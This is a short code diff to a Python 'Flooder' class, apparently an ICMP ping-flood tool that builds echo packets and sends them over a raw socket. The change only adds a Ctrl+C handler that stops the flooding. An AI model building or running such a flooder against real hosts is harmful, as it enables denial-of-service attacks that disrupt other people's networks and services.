@@ -1,5 +1,7 @@
+from sys import exit
 from struct import pack
 from time import time, sleep
+from signal import signal, SIGINT
 
 from socket import (
     socket,
@@ -31,7 +33,14 @@ class Flooder(object):
         header = pack("bbHHh", 8, 0, htons(self._checksum(header + data)), 1, 1)
         return header + data
 
+    def _close_flooding_event(self, sig, frame):
+        print('You pressed Ctrl+C!')
+        self.running_status = False
+        exit(0)
+
     def run_flooding(self, ip: str, port: int, length: int, frequency: float) -> None:
+        signal(SIGINT, self._close_flooding_event)
+
         sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)
         inet_aton(ip)
 
